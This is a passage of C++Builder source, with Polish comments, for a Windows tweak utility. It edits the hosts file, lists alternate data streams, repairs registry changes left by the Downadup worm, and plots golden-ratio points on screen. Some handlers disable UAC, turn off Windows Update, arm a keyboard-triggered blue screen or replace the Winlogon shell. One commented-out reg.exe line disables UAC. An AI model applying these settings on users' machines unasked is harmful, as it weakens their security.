 try{ rTemp2 = cTemp2.Trim().ToDouble(); } catch(...){ test = false;}

 if(!test)
 {
  if(!S::sDirectionSort) return CompareText(cTemp1.Trim(), cTemp2.Trim());
  return -CompareText(cTemp1.Trim(), cTemp2.Trim());
 }

 if(!S::sDirectionSort) return foo(rTemp1, rTemp2);
 return -foo(rTemp1, rTemp2);
}

// ---------------------------------------------------------------------------

void __fastcall TFibonacciR::ListView1ColumnClick(TObject *Sender, TListColumn *Column) {

	switch ( Column->Index )
	{
		case 0:
		{
			S::sDirectionSort = !S::sDirectionSort;
			((TListView *)Sender)->Tag = Column->Index;
			((TListView *)Sender)->CustomSort(CustomAutoSort, (long)((TListView *)Sender));
			break;
		}
		case 1:
		{
			ListView1->Clear();
			ListView1->Column[2]->Caption = "Rozmiar";
			if (Column->Caption == "Nazwa pliku") {

				ListView1->Column[1]->ImageIndex = 0;
				Column->Caption = "Nazwa strumienia";
				LabelEXT->Font->Color = clGrayText;
			}
			else {
				ListView1->Column[1]->ImageIndex = 1;
				Column->Caption = "Nazwa pliku";
				LabelEXT->Font->Color = clBlack;
			}
			break;
		}
		case 2:
		{

			S::sDirectionSort = !S::sDirectionSort;
			((TListView *)Sender)->Tag = 3;									   	// 3 poniewa¿ w tym indeksie (nie wyœwietlanym) jest przechowywana informacja o rozmiarze w bajtach
			((TListView *)Sender)->CustomSort(CustomAutoSort, (long)((TListView *)Sender));
			break;
		}

		default: ;

	}
	FibonacciR->ButtonSzukaj->Enabled = true;
}

//---------------------------------------------------------------------------


void __fastcall TFibonacciR::Notepad1Click(TObject *Sender)
{
	WinExec( (AnsiString( Form2->LabelDefProgPath->Caption + " "+ ListView1->ItemFocused->Caption +
		ListView1->ItemFocused->SubItems->Strings[0] )).c_str(), SW_SHOWNORMAL);//ShellExecuteA(0, "open", ((AnsiString)ListView1->ItemFocused->Caption+"\\").c_str() , "", "", 5);
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Wybierz1Click(TObject *Sender)
{
	unique_ptr<TOpenDialog> dlg(new TOpenDialog(FibonacciR));
	(*dlg).Filter = "*.*";
	(*dlg).FilterIndex = 2;
//	(*dlg).FileName = LinkLabelDefProgPath->Caption;
	(*dlg).Title = "Wybierz program domyœlny dla ADS";

	 (*dlg).Execute( Application->Handle);

	 if ((*dlg).FileName != "")
//		ExecuteApp( (*dlg).FileName + " " + ListView1->ItemFocused->Caption +
//		ListView1->ItemFocused->SubItems->Strings[0]);

WinExec( (AnsiString( (*dlg).FileName + " "+ ListView1->ItemFocused->Caption +
		ListView1->ItemFocused->SubItems->Strings[0] )).c_str(), SW_SHOWNORMAL);//ShellExecuteA(0, "open", ((AnsiString)ListView1->ItemFocused->Caption+"\\").c_str() , "", "", 5);

		(*dlg).Destroying() ;
}
//---------------------------------------------------------------------------


void __fastcall TFibonacciR::Odtwarzacz1Click(TObject *Sender)
{
	WinExec( (AnsiString( MPC_HC_Player_path + " " + ListView1->ItemFocused->Caption +
		ListView1->ItemFocused->SubItems->Strings[0] )).c_str(), SW_SHOWNORMAL);//ShellExecuteA(0, "open", ((AnsiString)ListView1->ItemFocused->Caption+"\\").c_str() , "", "", 5);
}
//---------------------------------------------------------------------------






void __fastcall TFibonacciR::ButtonHostAddBlockClick(TObject *Sender)
{
	if ( EditForwardHost->Text == "" ) { EditForwardHost->SetFocus(); return; }
	if ( EditBlockDomain->Text == "" ) { EditBlockDomain->SetFocus(); return; }

	unique_ptr<ofstream> hosts (new ofstream);

	(*hosts).open( ToArrW( &(S::WinDir + "\\System32\\drivers\\etc\\hosts")), ios::out | ios::app);

	if ( !(*hosts).is_open() ) ShowError("Nie uda³o siê otworzyæ pliku hosts");

	*hosts << "\n";
	*hosts << "\t" 		<< ToArrW( &(EditForwardHost->Text) );
	*hosts << "\t\t" 	<< ToArrW( &(EditBlockDomain->Text) );
	*hosts << "\t\t\t" 	<< ToArrW( &(EditDomain->Text) );

	(*hosts).close();
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditForwardHostDblClick(TObject *Sender)
{
WinExec( ToArrW( &( Form2->LabelDefProgPath->Caption + " " + S::WinDir + "\\System32\\drivers\\etc\\hosts")), SW_SHOWNORMAL);
}
//---------------------------------------------------------------------------


void __fastcall TFibonacciR::EditForwardHostKeyDown(TObject *Sender, WORD &Key, TShiftState Shift)

{
	if ( Key == vkReturn ) {
		Key = 0;                                                                // zapobiega dzwiêkowi
		ButtonHostAddBlock->OnClick(Sender);
	}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditForwardHostClick(TObject *Sender)
{
	if ( static_cast<TEdit*>(Sender)->Text == "" )

		if ( Clipboard()->HasFormat( CF_TEXT )) {

			String buff = Clipboard()->AsText;

					 // CompareStr() zwraca 0 gdy identyczne
			if ( !CompareText("http://", buff.SubString1(1, 7 ) )) 	buff.Delete( 1,7);  // usuwa http://
			if ( !CompareStr("www."	   , buff.SubString1(1, 4) )) 	buff.Delete( 1,4);  // wsuwa www.

			unique_ptr<int> dot_pos(new int (buff.LastDelimiter(".")));	   		// pozycja ostatniej kropki
			unique_ptr<int> last_slash(new int (buff.LastDelimiter("/"))); 	   	// pozycja ostatniego slasha

			while ( *dot_pos < *last_slash )                                   	// usuwa wyszystko za dot_pos (rozszerzeniem) do last_slash (ostatniego slasha)
			{
				buff.Delete( *last_slash, 100 );
				*last_slash = buff.LastDelimiter("/");
			}

			static_cast<TEdit*>(Sender)->Text = buff;
			static_cast<TEdit*>(Sender)->SelectAll();
		}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::CheckBoxFilesExtensionClick(TObject *Sender)
{
 if (!Form2->checking) {
	Reg->CloseKey();
	Reg->RootKey = HKEY_CURRENT_USER;                                    		// Ukrywanie rozrzerzeñ plików
	Reg->OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", false);

	Reg->WriteBool("HideFileExt", !CheckBoxFilesExtension->Checked);
 }
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::CheckBoxFilesShowAllClick(TObject *Sender)
{
if ( !Form2->checking ) {

	Reg->CloseKey();
	Reg->RootKey = HKEY_CURRENT_USER;                                    	// Ukrywanie plików
	Reg->OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", false);

	Reg->WriteBool("ShowSuperHidden", CheckBoxFilesShowAll->Checked);
	Reg->WriteInteger("Hidden", (CheckBoxFilesShowAll->Checked) ? 1 : 2 );
}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::CheckBoxcomandpromptClick(TObject *Sender)
{
	if (!Form2->checking) {
	  Reg->CloseKey();
	  Reg->RootKey = HKEY_CLASSES_ROOT;

		if (CheckBoxcomandprompt->Checked) {                                        // wiersz poleceñ dostêpny z ka¿dego folderu // jest dostêpny w menu kontekstowym gdy usuniête wartoœci w rejestrze

			Reg->OpenKey("Directory\\shell\\cmd", false);
			Reg->DeleteValue("Extended");

			Reg->OpenKey("Drive\\shell\\cmd", false);
			Reg->DeleteValue("Extended");

		} else {

			Reg->OpenKey("Directory\\shell\\cmd", true);
			Reg->WriteString("Extended", "");

			Reg->OpenKey("Drive\\shell\\cmd", true);
			Reg->WriteString("Extended", "");
		}
	 }
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::CheckBoxUACClick(TObject *Sender)
{
	 if (!Form2->checking) {

			Reg->CloseKey();
			Reg->RootKey = HKEY_LOCAL_MACHINE;
			Reg->OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
			Reg->WriteBool("EnableLUA", CheckBoxUAC->Checked );
	 }

	//	if ( CheckBoxUAC->Checked ) {	// enable
	//
	//		ShellExecuteA(0 , "open", "C:\Windows\System32\cmd.exe",
	//		" /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", 0, 0);
	//
	//	}	else {                     	// disable
	//
	//		ShellExecuteA(0 , "open",
	//		" /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f", 0, 0,0);
	//	}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::CheckBoxUpDateRebotClick(TObject *Sender)
{
  if (!Form2->checking) {
	Reg->CloseKey();                                                            // poniewa¿ tworzy klucze
	Reg->RootKey = HKEY_LOCAL_MACHINE;
	Reg->CreateKey("SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU");
	Reg->OpenKey("SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", false);
	Reg->WriteBool("NoAutoRebootWithLoggedOnUsers", CheckBoxUpDateRebot->Checked );
  }
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::CheckBoxBlueScreenClick(TObject *Sender)
{
	if (!Form2->checking) {

	  if (CheckBoxBlueScreen->Checked) {

		Reg->CloseKey();
		Reg->RootKey = HKEY_LOCAL_MACHINE;
		Reg->OpenKey("SYSTEM\\CurrentControlSet\\services\\kbdhid\\Parameters", 0);
		Reg->WriteBool("CrashOnCtrlScroll", 0);
		Reg->OpenKey("System\\CurrentControlSet\\Services\\i8042prt\\Parameters",0);
		Reg->WriteBool("CrashOnCtrlScroll", 0);

	   } else {

		if( Application->MessageBoxW ( 	L"Czy napewno chcesz aktywowaæ BlueScreen'a?\n\n ( Wywo³anie 2x naciœnij Prawy Alt + ScrollLock)", L"FibonacciR Blue Screen Question",
										MB_ICONQUESTION | MB_YESNO | MB_DEFBUTTON2) == ID_YES ) {
			Reg->CloseKey();
			Reg->RootKey = HKEY_LOCAL_MACHINE;
			Reg->OpenKey("SYSTEM\\CurrentControlSet\\services\\kbdhid\\Parameters", 0);
			Reg->WriteBool("CrashOnCtrlScroll", 1);
			Reg->OpenKey("System\\CurrentControlSet\\Services\\i8042prt\\Parameters",0);
			Reg->WriteBool("CrashOnCtrlScroll", 1);

		} else CheckBoxBlueScreen->Checked = 0;   // jeœli ID_NO
	   }
	  }
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::CheckBoxDisableADSRegClick(TObject *Sender)
{
	if (!Form2->checking) {

		Reg->CloseKey();
		Reg->RootKey = HKEY_CURRENT_USER;
		if ( CheckBoxDisableADSReg->Checked ) {

			Reg->OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments", true);
			Reg->WriteInteger( "SaveZoneInformation", 1 );
		}
		else
		{
			Reg->OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments", false);
			Reg->WriteInteger( "SaveZoneInformation", 0 );
		}
	}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::CheckBoxDisableUpDateClick(TObject *Sender)
{
	 if (!Form2->checking) {
		Reg->CloseKey();
		Reg->RootKey = HKEY_LOCAL_MACHINE;
		Reg->CreateKey("SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU");
		Reg->OpenKey("SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", false);
		Reg->WriteBool("NoAUAsDefaultShutdownOption", CheckBoxDisableUpDate->Checked );
		Reg->WriteBool("NoAutoUpdate", CheckBoxDisableUpDate->Checked );
	 }
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonRepairClick(TObject *Sender)
{
	Reg->CloseKey();
	Reg->RootKey = HKEY_CURRENT_USER;
	Reg->OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
	Reg->WriteInteger("NoDriveTypeAutoRun", 181);
	Reg->WriteString("NoControlPanel", "00000000");
	Reg->WriteString("DisableRegistryTools", "00000000");
	Reg->WriteString("NoDesktop", "00000000");
	Reg->WriteString("NoDispScrsavPage", "00000000");
	Reg->WriteString("NoViewOnDrive", "00000000");

	Reg->CloseKey();
	Reg->RootKey = HKEY_LOCAL_MACHINE;

	Reg->OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL", true);
	Reg->WriteInteger("CheckedValue", 1);
	Reg->OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN", true);
	Reg->WriteInteger("CheckedValue", 2);
//	 Reg->RegistryConnect()()


/* // Z WIRUSA  Wysy³ka statystyczna: W32.Downadup!autorun



______________________

Dzia³ania dotycz¹ce rejestru

Zmiana w rejestrze: HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Explorer\ Advanced->Hidden:1 Naprawiono
Zmiana w rejestrze: HKEY_USERS\S-1-5-21-942870468-337774767-1047725363-501\Software\Microsoft\Windows\CurrentVersion\Explorer\ Advanced->Hidden:1 Naprawiono
Zmiana w rejestrze: HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Explorer\ Advanced->Hidden:1 Naprawiono
Zmiana w rejestrze: HKEY_USERS\S-1-5-19\Software\Microsoft\Windows\CurrentVersion\Explorer\ Advanced->ShowSuperHidden:1 Naprawiono
Zmiana w rejestrze: HKEY_USERS\S-1-5-21-942870468-337774767-1047725363-501\Software\Microsoft\Windows\CurrentVersion\Explorer\ Advanced->ShowSuperHidden:1 Naprawiono
Zmiana w rejestrze: HKEY_USERS\S-1-5-20\Software\Microsoft\Windows\CurrentVersion\Explorer\ Advanced->ShowSuperHidden:1 Naprawiono
Zmiana w rejestrze: HKEY_USERS\S-1-5-21-942870468-337774767-1047725363-1001\Software\Microsoft\Windows\CurrentVersion\Policies\ Explorer->NoDriveTypeAutoRun:0 Naprawiono
Zmiana w rejestrze: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\ SHOWALL->CheckedValue:1 Naprawiono
Zmiana w rejestrze: HKEY_USERS\S-1-5-21-942870468-337774767-1047725363-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\ Advanced->Hidden:1 Naprawiono
Zmiana w rejestrze: HKEY_USERS\S-1-5-21-942870468-337774767-1047725363-1001\Software\Microsoft\Windows\CurrentVersion\Explorer\ Advanced->ShowSuperHidden:1 Naprawiono
____________________________
*/

}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonWMPContMenuClick(TObject *Sender)
{
	Reg->CloseKey();
	Reg->RootKey = HKEY_CLASSES_ROOT;                                           // windows media, kupno muzyki (usuwa)
	Reg->DeleteKey("SystemFileAssociations\\Directory.Audio\\shell");
	Reg->DeleteKey("SystemFileAssociations\\Directory.Image\\shell");
	Reg->DeleteKey("SystemFileAssociations\\Directory.Video\\shell");
	Reg->DeleteKey("SystemFileAssociations\\audio\\shell");
	Reg->DeleteKey("SystemFileAssociations\\video\\shell");
	Reg->DeleteKey("SystemFileAssociations\\Directory.Audio\\shellex\\ContextMenuHandlers\\WMPShopMusicvideo\\shell");

}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::TabSheetRejestrShow(TObject *Sender)
{
	if (Form2)
 		Form2->CheckRegSystemGroup();
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::OpenCurrFolderClick(TObject *Sender)
{
	if( IsDebuggerPresent() )                                                   // czy proces jest debugowany

		WinExec((AnsiString("explorer.exe /select, " + Application->ExeName)).c_str(), SW_SHOWNORMAL);
		// gdy jest debugowany œcie¿ka zawiera . (kropkê) w miejscu gdzie jest projekt
	else
		OpenFolderSelectFile( ParamStr(0).c_str() );
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonKonwertujClick(TObject *Sender)
{
	String out_path = "";
	ProgressBarMin();
	Application->ProcessMessages();

	if ( RadioButtonPulpit->Checked ) 				out_path = GetSpecialFolder( CSIDL_DESKTOPDIRECTORY );
	else if ( RadioButtonAcctualfolder->Checked )	out_path = GetCurrentDir() ;
	else if ( RadioButtonSourseFile->Checked ) 		out_path = GdiPlus->GetImageDir();
	else if ( RadioButtonLocalization->Checked )
	{
		out_path = EditLocalization->Text;

		CreateDir( out_path );
	}
	if ( out_path.Length() && out_path[out_path.Length()] != '\\' )
		out_path.Insert( "\\", out_path.Length()+1 );



	GdiPlus->Convert_Save( &( out_path + "myFile.png") );

	ProgressBarMax();
}
//---------------------------------------------------------------------------


void __fastcall TFibonacciR::EditLocalizationKeyDown(TObject *Sender, WORD &Key, TShiftState Shift)

{
	if (Key == vkReturn) ButtonKonwertuj->SetFocus();
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonRejestratorClick(TObject *Sender)
{
	ShellExecuteA(0, "open", "psr.exe", "", "", 5);
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::CheckBoxGodModeClick(TObject *Sender)
{
 if (!Form2->checking) {

	if (CheckBoxGodMode->Checked) {
	if (! ExistsDir("God Mode"))
		CreateDir("God Mode.{ED7BA470-8E54-465E-825C-99712043E01C}");
	   WinExec((AnsiString("explorer.exe /open, God Mode.{ED7BA470-8E54-465E-825C-99712043E01C}")).c_str(),
							SW_SHOWNORMAL);

	} else if (ExistsDir("God Mode.{ED7BA470-8E54-465E-825C-99712043E01C}"))
		RemoveDir("God Mode.{ED7BA470-8E54-465E-825C-99712043E01C}");
  }
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::RadioButton1Click(TObject *Sender)
{
	FibonacciR->ComboBoxQuality->Enabled = true;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::RadioButton2Click(TObject *Sender)
{
	ComboBoxQuality->Enabled = true;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::RadioButton3Click(TObject *Sender)
{
	ComboBoxQuality->Enabled = false;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ComboBoxQualityChange(TObject *Sender)
{
	ComboBoxQuality->Hint = "Compression " + ComboBoxQuality->Text.SubString(1,1) +  "0%";
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EN1Click(TObject *Sender)
{
Application->UseMetropolisUI();

}
//---------------------------------------------------------------------------
//   #include "reinit.hpp"
void __fastcall TFibonacciR::PL1Click(TObject *Sender)
{
//ShowMessage((int)Languages()->ID);
//	 Languages()->ID = 1;
//const ENGLISH = (SUBLANG_ENGLISH_US << 10) | LANG_ENGLISH;
//if (LoadNewResourceModule (ENGLISH) )
//ReinitializeForms () ;
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::SpinEdit1Change(TObject *Sender)
{
ValueListEditorBatch->CellRect(1,1);
ValueListEditorBatch->Repaint();
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::CheckBoxSaveClipboardClick(TObject *Sender)
{
GdiPlus->Convert( (String*)L"C:\\Users\\WorkSpace\\Desktop\\DSCN7470.JPG" ,
				   (String*)	L"C:\\Users\\WorkSpace\\Desktop\\test.png" );
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditConsoleBGColorChange(TObject *Sender)
{
Reg->CloseKey();

 Reg->RootKey = HKEY_CURRENT_USER;
 Reg->OpenKey("Console\\%SystemRoot%_system32_cmd.exe", false);
 Reg->WriteString("ColorTable00", EditConsoleBGColor->Text );
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditConsoleTextSizeChange(TObject *Sender)
{
  Reg->CloseKey();

 Reg->RootKey = HKEY_CURRENT_USER;
 Reg->OpenKey("Console\\%SystemRoot%_system32_cmd.exe", false);
 Reg->WriteString("FontSize", EditConsoleTextSize->Text );
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Button4Click(TObject *Sender)
{
	Reg->CloseKey();

	Reg->RootKey = HKEY_CURRENT_USER;
	Reg->OpenKey("Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\Regedit", false);
	Reg->WriteString("LastKey", "Computer\\HKEY_CLASSES_ROOT" );

	WinExec( "regedit.exe", SW_SHOWNORMAL  );
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::EditFileMangerChange(TObject *Sender)
{
 ProgressBarMin();
 Reg->CloseKey();

 Reg->RootKey =  HKEY_LOCAL_MACHINE;
 Reg->OpenKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", false);

 if ( Reg->ValueExists("Shell") )
 {

	if ( FileExists( EditFileManger->Text ) ) {

		EditFileManger->Color = clWebGreenYellow;
		Reg->WriteString( "Shell", EditFileManger->Text );
		EditFileManger->Hint = EditFileManger->Text;
		ProgressBarMax();
	}
	else
	{
		EditFileManger->Color 	= clWebSalmon;
		EditFileManger->Hint 	= "Podana œcie¿ka nie istnieje";
	}
 }
 else
	 ShowError("Wartoœæ \"Shell\" nie istnieje w rejestrze. ");

}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonRandomClick(TObject *Sender)
{    // MOUSE UP siê nie wykonuje

//		GetWindowRect(this->Handle, &rect);
//		SetWindowPos( this->Handle,(HWND__ *) 0,-1920, -1920, 0, 0, 0 );

		if ( CheckBoxClearP->Checked )
			Close_Points_WND();

		for ( int i = 0; i < 10; i++) {

			point_array.push_back( new TWPoint(this) );

			point_array[point_array.size()-1]->Show();

			int x, y;

			x = rand() % Xmax - 16;
			y = rand() % Ymax - 16;

			if (point_array.size() > 0)
				Move_WND( point_array[point_array.size()-1]->Handle,x,y);

		}

//	SetWindowPos( this->Handle,(HWND__ *) 0, rect.left, rect.top, rect.right-rect.left, rect.bottom-rect.top, 0 );

	   //	GetWindowDC(f3->Handle);
	  //	SetWindowPos( f3->Handle,(HWND__ *) HWND_NOTOPMOST,x, y, 50, 340,WS_OVERLAPPED );
}
//---------------------------------------------------------------------------


void __fastcall TFibonacciR::ButtonRandomMouseUp(TObject *Sender, TMouseButton Button,
		  TShiftState Shift, int X, int Y)
{
//	 SetWindowPos( this->Handle,(HWND__ *) 0, rect.left, rect.top, rect.right-rect.left, rect.bottom-rect.top, 0 );
}
//---------------------------------------------------------------------------


// TO DO usuwanie wskaŸników na formatke (handle = null) po 2klikniêciu


#define MIN(a,b) ((a) < (b) ? (a) : (b))
#define MAX( a, b ) (((a)>(b)) ? a : b)


void __fastcall TFibonacciR::ButtonLinFuncClick(TObject *Sender)
{
	CheckListPoints->Enabled = true;

	if ( CheckBoxClearP->Checked )
		 Close_Points_WND();

    int x, y;
	Punkt tab1( P1->pozX, P1->pozY );
	Punkt tab2( P2->pozX, P2->pozY );

//	Punkt tab1N( MIN(P1->pozX, P2->pozX), MIN(P1->pozY, P2->pozY));
//	Punkt tab2N( MAX(P1->pozX, P2->pozX), MAX(P1->pozY, P2->pozY));
	Linear_Func a( tab1, tab2 );    											// wyznacz wzory funkcji
//	Linear_Func aForNormal( tab1N, tab2N );

//	Linear_Func b(tab2, tab3);// = {  tab[1], tab[2] };
//	Punkt S;
//
//	S.X = (-b.Bnormal - a.Bnormal) / ( -b.Anormal - a.Anormal);
//	// S.Y = ((a.Anormal - b.Anormal) * S.X) - (a.Bnormal - b.Bnormal)/2;    /// so close
//	S.Y = -((a.Anormal + b.Anormal)  + (a.Bnormal + b.Bnormal) )* S.X;

//	Length(S, point)

	int odl = ( P1->pozX < P2->pozX )? P2->pozX - P1->pozX : P1->pozX - P2->pozX;
	odl /= 10;

	for ( int i = 0; i < 10; i++) {

		TWPoint  *	f3;
		f3 = new TWPoint(this);
	//	ImageListCursors->GetIcon( h % ImageListCursors->Count, f3->Image1->Picture->Icon );                           // ikona powodzenia

		int directionX = ( P1->pozX < P2->pozX )? 1 : -1;	// kierunek  prawo lewo
//		int directionY = ( P1->pozY < P2->pozY )? 1 : -1;    // kierunek  góra dól

		x = P1->pozX + ( ((odl * i+2) + odl/2) * directionX ) + 16 % Xmax - 16;
		y = ((int)a.CalcFor( x ) % Ymax);

		Move_WND( f3->Handle, x, y );
//		f3 -> Show();
	}

// ########################################################################

	fiX = FI * Minus( P1->pozX, P2->pozX );

	Create4OnLineArrows( &a, x, y );

//	Create4NormalArrows( &aForNormal, x, y );
	Create4NormalArrows( &a, x, y );

}
//---------------------------------------------------------------------------


void __fastcall TFibonacciR::Create4OnLineArrows( Linear_Func *a, int x, int y )
{

//	if ( P1->pozX < fiX ) {
//			ShowMessage("poza ekranem");
//	}

// ----- Line point 1 -----

	x = P1->pozX - ( FI *  Minus( P1->pozX, P2->pozX ) );
	y = (int)a->CalcFor( x );

	if ( P1->pozX > P2->pozX )
	{
		x += (2* Minus( P1->pozX, x ));

		if ( P1->pozY > P2->pozY )
		{
			y += (2* Minus( P1->pozY, y ));    // 1 æwiartka
		}
		else {
			y -= (2* Minus( P1->pozY, y ));    // 4 æwiartka
		}
	}

	point_array.push_back( new TWPoint( this, ID::ON_LINE, x, y ) );  			// 1 to ID Liniowych

// DEBUG
//	int c = x
//	Punkt w( x, y );
//	Punkt d( P1->pozX, P1->pozY );
//	Punkt e( P2->pozX, P2->pozY );
//		ShowMessage( FI * Length(e ,d));
//	ShowMessage( Length(w ,d));    // check it

// ----- Line point 2 -----

	x = P2->pozX - fiX;
		if ( P1->pozX > P2->pozX ) { x = P1->pozX - fiX; }

	y = (int)a->CalcFor( x );

	point_array.push_back( new TWPoint( this, ID::ON_LINE, x, y ) );  			// 1 to ID Liniowych

// ----- Line point 3 -----

	if ( P1->pozX > P2->pozX )
	{
				x = P2->pozX + fiX;
	} else { 	x = P1->pozX + fiX;
	}

	y = (int)a->CalcFor( x );

	point_array.push_back( new TWPoint( this, ID::ON_LINE, x, y ) );  			// 1 to ID Liniowych

// ----- Line point 4 -----

	x = fiX + P2->pozX;
	y = (int)a->CalcFor( x ) ;

	if ( P1->pozX > P2->pozX )
	{
		x -= (2* Minus( P2->pozX, x ));

		if ( P1->pozY > P2->pozY )
		{
			y -= (2* Minus( P2->pozY, y ));    // 1 æwiartka
		}
		else {
			y += (2* Minus( P2->pozY, y ));    // 4 æwiartka
		}
	}

	point_array.push_back( new TWPoint( this, ID::ON_LINE, x, y ) );  			// 1 to ID Liniowych

}

//---------------------------------------------------------------------------

void __fastcall TFibonacciR::Create4NormalArrows( Linear_Func *a, int x, int y )
{
	fiX = (1 - FI) *  Length( Punkt( P1->pozX, P1->pozY), Punkt( P2->pozX, P2->pozY) );
// ----- Normal point 1 -----


//	for ( int i = 0; i < 10; i++) {

//	x = P1->pozX - ( FI *  Length( Punkt( P1->pozX, P1->pozY), Punkt( P2->pozX, P2->pozY) ) )+ i*25;
//	y = (int)a->CalcForNormal( x );//+ Minus( P1->pozX, P2->pozX )*FI) ;

//	 if( P1->pozX < P2->pozX )
//		if ( P1->pozY < P2->pozY )      					//  punkty w 2, 4 æwiartce
//	{
	x =  P1->pozX + fiX;
	y = (int) a->CalcForNormal( x , Punkt( P1->pozX, P1->pozY ));
//
//	}
	point_array.push_back( new TWPoint( this, ID::NORMAL_TO_LINE, x, y ) );  // 2 to ID prostopad³ych
//	}

// ----- Normal point 2 -----

	x =  P1->pozX - fiX;
	y = (int) a->CalcForNormal( x , Punkt( P1->pozX, P1->pozY ));

	point_array.push_back( new TWPoint( this, ID::NORMAL_TO_LINE, x, y ) );

// ----- Normal point 3 -----

	x =  P2->pozX + fiX;
	y = (int) a->CalcForNormal( x , Punkt( P2->pozX, P2->pozY ));

	point_array.push_back( new TWPoint( this, ID::NORMAL_TO_LINE, x, y ) );

// ----- Normal point 4 -----
	x =  P2->pozX - fiX;
	y = (int) a->CalcForNormal( x , Punkt( P2->pozX, P2->pozY ));

	point_array.push_back( new TWPoint( this, ID::NORMAL_TO_LINE, x, y ) );

}

//---------------------------------------------------------------------------

void  TFibonacciR::set_main_point_pos( TWPoint *Point, TForm *Owner )
{
	POINT p;
	Point->Show();

	if (GetCursorPos(&p))
	{
		GetWindowRect(Owner->Handle, &rect);
//		Move_WND( Owner->Handle, -2000,-2000 );
	}
	do
	{
		if ( Point != NULL )
			if (GetCursorPos(&p))
			{
				Move_WND( Point->Handle, p.x, p.y );
				StatusInfo( String(p.x + "x" + p.y) );
			}
		Sleep(1);

//	} while ( (GetKeyState(VK_LBUTTON) & 0x80) != 0 ) ; //nie bangla
	} while (  (GetAsyncKeyState(VK_LBUTTON) ) ) ;
}

//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonP2MouseDown(TObject *Sender, TMouseButton Button,
		  TShiftState Shift, int X, int Y)
{
	ButtonLinFunc->Enabled = true;

	ImageListCursors->GetIcon( 2 %
	 ImageListCursors->Count, P2->Image1->Picture->Icon );                           // ikona powodzenia

     P2->Visible = true;
	set_main_point_pos( P2, this );
	SetWindowPos( this->Handle,(HWND__ *) 0, rect.left, rect.top, rect.right-rect.left, rect.bottom-rect.top, 0 );

}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonP1MouseDown(TObject *Sender, TMouseButton Button,
		  TShiftState Shift, int X, int Y)
{
	ButtonP2->Enabled = true;

	P1->Show();
	ImageListCursors->GetIcon( 2 %
	 ImageListCursors->Count, P1->Image1->Picture->Icon );                           // ikona powodzenia

	set_main_point_pos( P1, this );
		SetWindowPos( this->Handle,(HWND__ *) 0, rect.left, rect.top, rect.right-rect.left, rect.bottom-rect.top, 0 );

}
//---------------------------------------------------------------------------



void __fastcall TFibonacciR::ButtonP2MouseMove(TObject *Sender, TShiftState Shift,
          int X, int Y)
{
//	P2->Visible = true;
//	ImageListCursors->GetIcon( 32 %
//	 ImageListCursors->Count, P2->Image1->Picture->Icon );                           // ikona powodzenia

}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonP2MouseEnter(TObject *Sender)
{
	if (P2->Visible) {
			ImageListCursors->GetIcon( 3 %
		 ImageListCursors->Count, P2->Image1->Picture->Icon );                  // ikona yellow

	}
}
//---------------------------------------------------------------------------

void __fastcall TFibonacciR::ButtonP2MouseLeave(TObject *Sender)
{
ImageListCursors->GetIcon( 2 %
